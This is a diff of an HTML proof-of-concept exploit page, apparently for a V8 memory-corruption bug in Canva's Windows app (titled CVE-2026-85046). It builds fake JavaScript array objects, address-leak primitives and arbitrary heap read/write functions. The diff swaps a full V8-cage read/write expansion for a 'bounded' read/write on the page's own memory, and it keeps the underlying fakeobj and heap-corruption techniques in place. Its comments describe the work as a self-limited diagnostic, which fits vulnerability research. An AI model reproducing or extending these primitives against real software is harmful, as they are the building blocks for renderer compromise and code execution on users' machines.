@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Canva Windows reference-spray diagnostic v12</title>
+    <title>CVE-2026-85046 - Canva Windows bounded primitive diagnostic v13</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -178,7 +178,7 @@
       var running = false;
 
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v12-last");
+        var previousDiagnostic = localStorage.getItem("f022-v13-last");
         if (previousDiagnostic) {
           setTimeout(function () {
             log("[previous diagnostic] " + previousDiagnostic);
@@ -436,7 +436,7 @@
 
         try {
           localStorage.setItem(
-            "f022-v12-last",
+            "f022-v13-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
@@ -550,56 +550,98 @@
           );
 
         dbg("      [7.3] stage-3 fake JSArray landing confirmed (length=32)");
-        if (f2w0(master[0]) !== PACKED_DOUBLE_MAP)
-          throw new Error("map word mismatch");
-        if (f2w1(master[0]) !== EMPTY_PROPERTIES)
-          throw new Error("properties word mismatch");
-        if (f2w1(master[1]) !== 6)
-          throw new Error("victim.length word mismatch");
 
-        var victim_orig_elems = f2w0(master[1]); // victim's REAL elements pointer (for restore)
+        // master[0]/master[1] now alias the REAL victim JSArray header.
+        // Do not assume that the victim uses the same context-specific map as
+        // the fake master. Capture and preserve the victim's actual header.
+        var victim_map = f2w0(master[0]);
+        var victim_properties = f2w1(master[0]);
+        var victim_orig_elems = f2w0(master[1]);
+        var victim_length_word = f2w1(master[1]);
+
+        dbg(
+          "      [7.4] victim header: map=" +
+            hex(victim_map) +
+            " properties=" +
+            hex(victim_properties) +
+            " elements=" +
+            hex(victim_orig_elems) +
+            " lengthWord=" +
+            hex(victim_length_word),
+        );
+
+        if (victim_length_word !== 6)
+          throw new Error(
+            "victim header alias is inconsistent (expected Smi(3)=0x6, got " +
+              hex(victim_length_word) +
+              ")",
+          );
 
         // Plain array — the caller unpacks into locals and drops it immediately,
         // so no field of this object is reachable from any heap root afterwards.
-        return [master, victim, victim_base, victim_orig_elems, dead_addr];
+        return [
+          master,
+          victim,
+          victim_base,
+          victim_map,
+          victim_properties,
+          victim_orig_elems,
+          victim_length_word,
+          dead_addr,
+        ];
       }
 
       // ---------------------------------------------------------------------------
-      // Durable primitives — master[0]/[1] alias the victim JSArray header words:
-      //   master[0] <-> victim [map|properties]
-      //   master[1] <-> victim [elements|length]
-      // master and victim are ALWAYS passed as parameters (stack slots) — never
-      // captured in globals or closures (see attempt_fakeobj header comment).
+      // Bounded header-preserving primitive.
+      //
+      // master[0]/master[1] alias the victim header.  Keep the victim's actual
+      // context-specific map/properties untouched and only redirect its elements
+      // pointer while validating against memory owned by this PoC.
       // ---------------------------------------------------------------------------
-      function addr_of(master, victim, o) {
-        // returns TAGGED compressed pointer
-        master[0] = w2f(PACKED_ELEMENTS_MAP, EMPTY_PROPERTIES); // victim map -> PACKED_ELEMENTS
-        victim[0] = o; // tagged store into slot 0
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES); // flip back
-        var t = f2w0(victim[0]); // low word = compressed ptr
-        victim[0] = 1.22; // restore slot 0: leaves no stale pointer for later GCs
-        return t;
-      }
-
-      function heap_read_w01(master, victim, addr) {
-        // addr: UNTAGGED even; returns [w0, w1]
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        master[1] = w2f(((addr - 8) | 1) >>> 0, FAKE_LEN_SMI); // victim.elements = addr-8
-        var d = victim[0]; // double at (addr-8)+8 = addr
+      function victim_read_w01(
+        master,
+        victim,
+        victim_map,
+        victim_properties,
+        victim_length_word,
+        addr,
+      ) {
+        master[0] = w2f(victim_map, victim_properties);
+        master[1] = w2f(
+          ((addr - 8) | 1) >>> 0,
+          victim_length_word,
+        );
+        var d = victim[0];
         return [f2w0(d), f2w1(d)];
       }
 
-      function heap_write_ww(master, victim, addr, w0, w1) {
-        // writes [w0][w1] at addr
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        master[1] = w2f(((addr - 8) | 1) >>> 0, FAKE_LEN_SMI);
+      function victim_write_ww(
+        master,
+        victim,
+        victim_map,
+        victim_properties,
+        victim_length_word,
+        addr,
+        w0,
+        w1,
+      ) {
+        master[0] = w2f(victim_map, victim_properties);
+        master[1] = w2f(
+          ((addr - 8) | 1) >>> 0,
+          victim_length_word,
+        );
         victim[0] = w2f(w0, w1);
       }
 
-      function restore_victim(master, victim, orig_elems) {
-        // put the header back; heap stays sane
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        master[1] = w2f(orig_elems, 6); // real elements + Smi(3) length
+      function restore_victim_header(
+        master,
+        victim_map,
+        victim_properties,
+        victim_orig_elems,
+        victim_length_word,
+      ) {
+        master[0] = w2f(victim_map, victim_properties);
+        master[1] = w2f(victim_orig_elems, victim_length_word);
       }
 
       function w2str(w) {
@@ -715,14 +757,20 @@
         // Pre-create every demo target BEFORE the reclaim: after `master` exists,
         // each sprayed array is unreferenced garbage, so we keep the post-reclaim
         // window nearly allocation-free to avoid a scavenge recycling it.
-        var scratch = [1.1, 2.2, 3.3]; // owned write-proof target
-        var rw = new Float64Array(8);
-        var box = [{}, {}];
+        var scratch = [1.1, 2.2, 3.3]; // owned read/write proof target
+
+        // Resolve the owned target before the fragile fake object exists.
+        // addrof_leak returns the untagged compressed heap address.
+        var scratch_base = addrof_leak(scratch);
+        log("    precomputed scratch base = " + hex(scratch_base));
 
         var master = null,
           victim = null,
           victim_base = 0,
+          victim_map = 0,
+          victim_properties = 0,
           victim_orig_elems = 0,
+          victim_length_word = 0,
           master_addr = 0;
         var attempts = 0,
           maxAttempts = 1;
@@ -741,8 +789,11 @@
             master = st[0];
             victim = st[1];
             victim_base = st[2];
-            victim_orig_elems = st[3];
-            master_addr = st[4];
+            victim_map = st[3];
+            victim_properties = st[4];
+            victim_orig_elems = st[5];
+            victim_length_word = st[6];
+            master_addr = st[7];
             st = null; // drop the carrier array — master now lives only in locals
           } catch (e) {
             log("      failed: " + e.message);
@@ -759,75 +810,112 @@
           log("    The reclaim is GC-timing dependent — reload and run again.");
           return;
         }
-        // Allocation-minimal owned-memory proof. Do not log or allocate between
-        // obtaining the fake object and restoring the victim header.
-        master[0] = w2f(PACKED_ELEMENTS_MAP, EMPTY_PROPERTIES);
-        victim[0] = scratch;
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        var scratch_tagged = f2w0(victim[0]);
-        victim[0] = 1.22;
+        // ================= Step 4: bounded owned-memory proof =================
+        //
+        // Do not change the victim's map.  Redirect only its elements pointer to
+        // memory owned by this PoC, observe the scratch header, write scratch[0],
+        // restore it, then restore the victim header.
+        log("");
+        log("[*] Step 4: bounded owned-memory R/W proof...");
 
-        master[1] = w2f((((scratch_tagged - 1) >>> 0) | 1) >>> 0, FAKE_LEN_SMI);
-        var scratch_header = victim[0];
-        var scratch_elements = f2w0(scratch_header);
-        var observed_length_word = f2w1(scratch_header);
+        var scratch_header = victim_read_w01(
+          master,
+          victim,
+          victim_map,
+          victim_properties,
+          victim_length_word,
+          scratch_base,
+        );
+        var scratch_map = scratch_header[0];
+        var scratch_properties = scratch_header[1];
 
-        master[1] = w2f(scratch_elements, FAKE_LEN_SMI);
-        victim[0] = 13.37;
-        var write_proof_ok = scratch[0] === 13.37;
+        var scratch_elements_pair = victim_read_w01(
+          master,
+          victim,
+          victim_map,
+          victim_properties,
+          victim_length_word,
+          scratch_base + 8,
+        );
+        var scratch_elements = scratch_elements_pair[0];
+        var scratch_length_word = scratch_elements_pair[1];
 
-        master[1] = w2f(victim_orig_elems, 6);
-        var rw_tagged = addr_of(master, victim, rw);
-        var rw_address = untag(rw_tagged);
-        var rw_backing_pair = heap_read_w01(master, victim, rw_address + 56);
-        var rw_backing_high = rw_backing_pair[1];
-        master[1] = w2f(victim_orig_elems, 6);
-        var box_tagged = addr_of(master, victim, box);
-        var box_header = heap_read_w01(master, victim, untag(box_tagged) + 8);
-        var box_elements = box_header[0];
-
-        // Expand only the owned Float64Array to cover the V8 cage. The high word
-        // of its existing sandboxed backing pointer is retained.
-        heap_write_ww(master, victim, rw_address + 32, 0, 0x20000000);
-        heap_write_ww(master, victim, rw_address + 48, 0x04000000, 0);
-        heap_write_ww(master, victim, rw_address + 56, 0, rw_backing_high);
-
-        restore_victim(master, victim, victim_orig_elems);
-
-        cage_rw = rw;
-        object_box = box;
-        box_slot = untag(box_elements) + 8;
-        proof_obj = scratch;
-
+        // First double element lives at FixedDoubleArray+8.
         var scratch_data = untag(scratch_elements) + 8;
-        var saved_low = cageRead32(scratch_data);
-        var saved_high = cageRead32(scratch_data + 4);
-        cageWrite32(scratch_data, f2w0(42.42));
-        cageWrite32(scratch_data + 4, f2w1(42.42));
-        var full_cage_write_ok = scratch[0] === 42.42;
-        cageWrite32(scratch_data, saved_low);
-        cageWrite32(scratch_data + 4, saved_high);
-        var restored = scratch[0] === 13.37;
+        var original_pair = victim_read_w01(
+          master,
+          victim,
+          victim_map,
+          victim_properties,
+          victim_length_word,
+          scratch_data,
+        );
+
+        var desired = 13.37;
+        victim_write_ww(
+          master,
+          victim,
+          victim_map,
+          victim_properties,
+          victim_length_word,
+          scratch_data,
+          f2w0(desired),
+          f2w1(desired),
+        );
+
+        var write_observed = scratch[0] === desired;
+
+        // Restore the owned target and victim before any further allocations/logging.
+        victim_write_ww(
+          master,
+          victim,
+          victim_map,
+          victim_properties,
+          victim_length_word,
+          scratch_data,
+          original_pair[0],
+          original_pair[1],
+        );
+        restore_victim_header(
+          master,
+          victim_map,
+          victim_properties,
+          victim_orig_elems,
+          victim_length_word,
+        );
+
+        var restored = scratch[0] === 1.1;
 
         var bounded = {
           outcome:
-            write_proof_ok && full_cage_write_ok && restored
-              ? "full-cage-rw-confirmed"
-              : "full-cage-rw-failed",
+            write_observed && restored
+              ? "bounded-owned-rw-confirmed"
+              : "bounded-owned-rw-failed",
           addrof: looksLikeAddresses,
           fakeobj: true,
-          scratchTagged: hex(scratch_tagged),
+          stage3Landing: true,
+          victimMap: hex(victim_map),
+          victimProperties: hex(victim_properties),
+          victimElements: hex(victim_orig_elems),
+          victimLengthWord: hex(victim_length_word),
+          scratchBase: hex(scratch_base),
+          scratchMap: hex(scratch_map),
+          scratchProperties: hex(scratch_properties),
           scratchElements: hex(scratch_elements),
-          scratchLengthWord: observed_length_word,
-          scratchValueAfter: scratch[0],
-          fullCageWriteObserved: full_cage_write_ok,
-          fullCageWriteRestored: restored,
+          scratchLengthWord: hex(scratch_length_word),
+          writeObserved: write_observed,
+          restored: restored,
+          scratchValueAfterRestore: scratch[0],
           ownedMemoryOnly: true,
+          fullCageExpansionAttempted: false,
           externalNetworkUsed: false,
           nativeCodeExecutionAttempted: false,
           sandboxEscapeAttempted: false,
         };
+
         window.probeResult = bounded;
+        document.getElementById("output").textContent +=
+          "\n\n" + JSON.stringify(bounded);
         document.getElementById("output").textContent = JSON.stringify(bounded);
       }
 
